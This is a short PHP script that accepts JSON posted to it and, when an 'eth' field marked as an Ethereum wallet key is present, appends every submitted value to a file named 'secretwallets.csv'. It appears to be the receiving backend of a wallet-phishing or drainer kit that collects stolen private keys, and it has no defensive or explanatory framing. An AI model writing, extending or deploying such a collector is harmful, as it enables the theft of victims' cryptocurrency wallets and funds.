<?php 
  
  header("Content-Type: application/json"); 
  $data = json_decode(file_get_contents("php://input"));

  if ($data->eth) {  // if ethereum wallet key
      $wallet = fopen("secretwallets.csv", "a+") or die("Can't open file, check permissions");
      foreach ($data as $key => $value) {
        fwrite($wallet, $value."\n");
      }
  }

  ?> 